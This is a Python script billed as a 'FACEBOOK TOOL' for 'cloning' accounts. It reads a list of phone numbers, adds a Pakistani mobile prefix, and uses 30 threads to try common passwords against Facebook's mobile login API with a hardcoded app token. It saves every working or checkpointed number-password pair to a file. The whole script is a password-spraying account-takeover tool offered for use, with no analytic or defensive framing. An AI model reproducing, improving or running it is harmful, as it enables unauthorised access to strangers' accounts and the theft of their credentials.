import os
import sys
import time
import random
import json
from multiprocessing.pool import ThreadPool
import requests
from requests.exceptions import ConnectionError

def clear_console():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_banner():
    print("""
\033[1;94mFACEBOOK TOOL
\033[1;92mFB PAGE   FACEBOOK PAGE
""")
    print("""
███████╗██╗   ██╗     ██╗██╗████████╗
██╔════╝██║   ██║     ██║██║╚══██╔══╝
███████╗██║   ██║     ██║██║   ██║   
╚════██║██║   ██║██   ██║██║   ██║   
███████║╚██████╔╝╚█████╔╝██║   ██║   
╚══════╝ ╚═════╝  ╚════╝ ╚═╝   ╚═╝   
""")

def login():
    clear_console()
    print_banner()
    username = input("\033[1;97mTool Username \x1b[1;97m»» \x1b[1;97m")
    password = input("\033[1;97mTool Password \x1b[1;97m» \x1b[1;97m")

    if username == "FREE TOOLS" and password == "FREE FREE FREE":
        print("Logged in successfully as " + username)
        time.sleep(2)
        main_menu()
    else:
        print("\033[1;94mWrong Username or Password")
        time.sleep(1)
        login()

def main_menu():
    clear_console()
    print_banner()
    print("\033[1;93m[1] \x1b[1;91mSTART")
    print("\033[1;95m[2] \x1b[1;96mEXIT")
    choice = input("\n\033[1;95mCHOOSE : \033[1;93m")
    if choice == "1":
        start_cloning()
    elif choice == "2":
        sys.exit()
    else:
        print("\x1b[1;97mFill In Correctly")
        main_menu()

def start_cloning():
    clear_console()
    print_banner()
    print("\033[1;93mEnter any Pakistan Mobile code Number")
    code = input("\033[1;97mCHOOSE : ")
    idlist = '.txt'
    try:
        with open(idlist, "r") as file:
            ids = [line.strip() for line in file]
    except IOError:
        print("[!] File Not Found")
        input("\n[ Back ]")
        main_menu()

    def main(arg):
        user = arg
        try:
            os.makedirs('save', exist_ok=True)
        except OSError:
            pass

        password_list = ['password1', '123456', 'password', 'admin']  # Example passwords
        for password in password_list:
            try:
                response = requests.post(
                    'https://b-api.facebook.com/method/auth.login',
                    params={
                        'access_token': '237759909591655|0f140aabedfb65ac27a739ed1a2263b1',
                        'format': 'json',
                        'sdk_version': '1',
                        'email': code + user,
                        'locale': 'en_US',
                        'password': password,
                        'sdk': 'ios',
                        'generate_session_cookies': '1',
                        'sig': '3f555f98fb61fcd7aa0c44f58f522efm'
                    }
                )
                q = response.json()
                if 'access_token' in q:
                    print(f'\x1b[1;32m[OK] {code + user} | {password}')
                    with open('save/cloned.txt', 'a') as okb:
                        okb.write(f'{code + user} | {password}\n')
                elif 'www.facebook.com' in q.get('error_msg', ''):
                    print(f'\033[1;97m[CP] {code + user} | {password}')
                    with open('save/cloned.txt', 'a') as cps:
                        cps.write(f'{code + user} | {password}\n')
            except ConnectionError:
                pass

    p = ThreadPool(30)
    p.map(main, ids)
    print('Process Has Been Completed...')
    print('Cloned Accounts Has Been Saved: save/cloned.txt')

if __name__ == '__main__':
    login()
